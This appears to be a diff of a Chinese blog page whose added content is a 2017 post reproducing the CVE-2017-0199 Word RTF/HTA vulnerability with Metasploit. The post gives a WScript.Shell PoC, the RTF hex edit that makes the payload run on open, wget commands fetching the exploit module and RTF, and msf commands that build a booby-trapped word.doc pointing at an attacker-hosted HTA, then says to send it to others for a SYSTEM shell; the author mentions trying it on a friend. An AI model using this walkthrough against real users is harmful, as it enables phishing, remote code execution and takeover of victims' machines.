@@ -6,17 +6,33 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://fjhack.me">
-  <title>Tag: 爬虫 Python | 晚睡早起学习好！</title>
+  <title>Word漏洞msf复现与浅析 | 晚睡早起学习好！</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="生存地">
-<meta property="og:type" content="website">
-<meta property="og:title" content="晚睡早起学习好！">
-<meta property="og:url" content="http://fjhack.me/tags/爬虫-Python/index.html">
+  <meta name="description" content="前言漏洞编号：CVE-2017-0199
+影响版本：所有版本office word
+漏洞危害：受害者打开含有危险代码的word文档，利用msf可以获取到一个system权限shell。
+修复方式：升级office，下载相关补丁。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Word漏洞msf复现与浅析">
+<meta property="og:url" content="http://fjhack.me/2017/05/03/09/index.html">
 <meta property="og:site_name" content="晚睡早起学习好！">
-<meta property="og:description" content="生存地">
+<meta property="og:description" content="前言漏洞编号：CVE-2017-0199
+影响版本：所有版本office word
+漏洞危害：受害者打开含有危险代码的word文档，利用msf可以获取到一个system权限shell。
+修复方式：升级office，下载相关补丁。">
+<meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/1213.jpg">
+<meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/_F_T66I6N9%28WLP%29W%29ZKJOIH.png">
+<meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/%5B%5BEO%7B115%7BUSRO1%253OU@Z01M.png">
+<meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/74W7L%60$%25QH%7BD9W8%7D3%287M8%253.png">
+<meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/AZ7_@BN4O%7B%7B0NN%25%28%5BO6$90X.png">
+<meta property="og:updated_time" content="2017-05-03T15:08:44.513Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="晚睡早起学习好！">
-<meta name="twitter:description" content="生存地">
+<meta name="twitter:title" content="Word漏洞msf复现与浅析">
+<meta name="twitter:description" content="前言漏洞编号：CVE-2017-0199
+影响版本：所有版本office word
+漏洞危害：受害者打开含有危险代码的word文档，利用msf可以获取到一个system权限shell。
+修复方式：升级office，下载相关补丁。">
+<meta name="twitter:image" content="http://oo1re7zx4.bkt.clouddn.com/1213.jpg">
   
     <link rel="alternative" href="/atom.xml" title="晚睡早起学习好！" type="application/atom+xml">
   
@@ -152,60 +168,179 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-09" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/04/09/06/" class="archive-article-date">
-  	<time datetime="2017-04-08T16:46:33.997Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-09</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/04/09/06/">Python之路---最简单的爬虫</a>
+    <h1 class="article-title" itemprop="name">
+      Word漏洞msf复现与浅析
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2017/05/03/09/" class="archive-article-date">
+  	<time datetime="2017-05-03T15:02:16.539Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-03</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>漏洞编号：CVE-2017-0199</p>
+<p>影响版本：所有版本office word</p>
+<p>漏洞危害：受害者打开含有危险代码的word文档，利用msf可以获取到一个system权限shell。</p>
+<p>修复方式：升级office，下载相关补丁。</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h2 id="个人浅析"><a href="#个人浅析" class="headerlink" title="个人浅析"></a>个人浅析</h2><p><img src="http://oo1re7zx4.bkt.clouddn.com/1213.jpg" alt=""><br>这个漏洞发布的挺早，但是一直没有时间去真正的研究，昨天在和朋友Fanx-jk的交流研究下，成功在本地复现了这个漏洞，相对比smb445远程溢出漏洞的主动攻击，这个word漏洞显然显得有些被动，需要主动去钓鱼，但是有一点比较好，那么就是国产的杀软大部分还是没有检测出来的</p>
+<p>：）</p>
+<p>简单来说就是构造一个含有外部链接文件的wrod文档，然后发给受害者，当受害者打开这个word的时候，会自动下载第三方链接的文件内容并执。</p>
+<p>poc：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">a=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="string">'%windir%\\System32\\cmd.exe /c calc.exe'</span>, <span class="number">0</span>);<span class="built_in">window</span>.close();</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这是网上流传比较广的一个poc，分析发现是一段VBS的脚本，其功能就是在计算机上调用shell打开calc.exe这个计算器。把这段代码写入到一个rtf文件中，并放在远程web服务器上，前提是服务器开启webdav，kali下自带阿帕奇服务，然后在word的插入对象中，把刚刚的rtf文件添加进对象，因为Office通过 URL moniker来发送远程的请求，所以，它会自动去下载那个RTF文件，而这个文件包含的是一个VBS的脚本，URLmoniker会通过content-type文件扩展把这个文件识别为HTA文件，然后系统中专门用来识别HAT文件的mashat.exe会自动匹配脚本数据，并且将它执行，那么那段VBS脚本也被执行了，但是需要手动去触发这个hta文件，利用winhex软件通过修改文件的十六进制代码，可以实现自启动<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">\o</span>bject<span class="symbol">\o</span>bjautlink<span class="symbol">\r</span>sltpict修改为<span class="symbol">\o</span>bject<span class="symbol">\o</span>bjautlink<span class="symbol">\o</span>bjupdate<span class="symbol">\r</span>sltpict</div></pre></td></tr></table></figure><br>这些是我看了一些大牛们写的资料后简单的个人理解，但是针对于这个漏洞，不仅仅是可以调用计算器那么简单，通过修改vbs代码，我们几乎可以干任何事情，有大神写出了用msf生成的word，打开即可返回一个shell。</p>
+<p>URL moniker：（这是一个由系统生成的对象，可以利用该对象去另一个对象中获取数据）</p>
+<p>content-type：（Content-Type，内容类型，一般是指网页中存在的Content-Type，用于定义网络文件的类型和网页的编码，决定文件接收方将以什么形式、什么编码读取这个文件）</p>
+<p>HAT：（HTML应用程序）</p>
+<hr>
+<h2 id="利用msf反弹shell"><a href="#利用msf反弹shell" class="headerlink" title="利用msf反弹shell"></a>利用msf反弹shell</h2><p>利用工具：kali下的msf，msf需要更新到最新版本，不然无法开启hta服务。</p>
+<p>我这边用的是ssh，因为另一台电脑装了kali最新版，所以直接开个ssh。</p>
+<p>首先cd 到<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="regexp">/usr/</span>share<span class="regexp">/metasploit-framework/</span>modules<span class="regexp">/exploits/</span>windows/fileformat 目录下</div><div class="line"></div><div class="line">wget <span class="string">https:</span><span class="comment">//raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/modules/exploits/windows/fileformat/office_word_hta.rb</span></div></pre></td></tr></table></figure><br>然后执行wget下载payload，然后切换到<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="regexp">/usr/</span>share<span class="regexp">/metasploit-framework/</span>data<span class="regexp">/exploits/</span></div><div class="line"></div><div class="line">wget https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/nixawk/m</span>etasploit-framework<span class="regexp">/3d082814cbedc065f329498b9c6fb7951f8ebbd5/</span>data<span class="regexp">/exploits/</span>cve-<span class="number">2017</span>-<span class="number">0199</span>.rtf</div></pre></td></tr></table></figure></p>
+<p>wget下载exploit。</p>
+<p>进入到msf，使用relod_all，刷新一下下载的载荷。<br><img src="http://oo1re7zx4.bkt.clouddn.com/_F_T66I6N9%28WLP%29W%29ZKJOIH.png" alt=""></p>
+<p>然后开启hat服务<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/windows/misc/ht<span class="built_in">a_server</span> </div><div class="line">msf exploit(ht<span class="built_in">a_server</span>) &gt; run</div></pre></td></tr></table></figure><br><img src="http://oo1re7zx4.bkt.clouddn.com/%5B%5BEO%7B115%7BUSRO1%253OU@Z01M.png" alt=""></p>
+<p>上面的命令相当于开启了一个web服务，并且提供了一个可供下载的hat文件。<br><a href="http://10.20.79.234:8080/yETy5CKuqcXljn.hta" target="_blank" rel="external">http://10.20.79.234:8080/yETy5CKuqcXljn.hta</a></p>
+<p>加载exploit<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/fileformat/office_word_hta<span class="comment"> //加载exploit</span></div><div class="line"><span class="built_in">set</span> TARGETURI <span class="keyword">http</span>://<span class="number">10.20</span><span class="number">.79</span><span class="number">.234</span>:<span class="number">8080</span>/yETy5CKuqcXljn.hta<span class="comment"> //加载刚刚生成的hta文件</span></div><div class="line"><span class="built_in">set</span> FILENAME <span class="built_in">word</span>.doc<span class="comment"> //设置生成doc文件的文件名</span></div><div class="line">run<span class="comment"> //生成一个嵌套代码的word文档。</span></div><div class="line">cp /root/.msf4/<span class="built_in">local</span>/<span class="built_in">word</span>.doc /<span class="built_in">word</span>.doc<span class="comment"> //将生成的文件拷贝到根目录。</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://oo1re7zx4.bkt.clouddn.com/74W7L%60$%25QH%7BD9W8%7D3%287M8%253.png" alt=""></p>
+<p>生成的word文件在root下的一个隐藏目录，我们直接把文件cp到桌面，发给别人打开即可获取一个shell，shell是system权限，上远控，交互shell，几乎想什么就什么，这里就不多做解释，因为我也没有实战  </p>
+<p>发给朋友还被识破了计谋，尴尬！：(</p>
+<p>返回的shell是以session方式保存的，所以可以同时控制多个shell。<br><img src="http://oo1re7zx4.bkt.clouddn.com/AZ7_@BN4O%7B%7B0NN%25%28%5BO6$90X.png" alt=""></p>
+<hr>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这个漏洞总体来说，杀伤力还是非常强的，唯一的不足是还没研究明白怎么打开后显示正常内容，晚点研究一下。</p>
+<p>最近爆的漏洞挺多的，例如stur2-045-046，phpcms，snmp，wordpass。。。不知道是巧合还是特意的呢？：）</p>
+<!-- UY BEGIN -->
+<p><div id="uyan_frame"></div></p>
+<p><script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2129863"></script><br><!-- UY END --></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>我的梦想，歌舞厅里，只唱歌，桑拿馆里就洗澡。果然是梦想。：)<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">爬虫 Python</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">kali CVE-2017-0199</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://fjhack.me/2017/05/03/09/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2017/04/16/08/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Windows漏洞实战，盲打女寝</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+  
+    <div class="duoshuo"></div>
   
 
-    
+
 
 
           </div>
@@ -229,9 +364,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		root: "/",
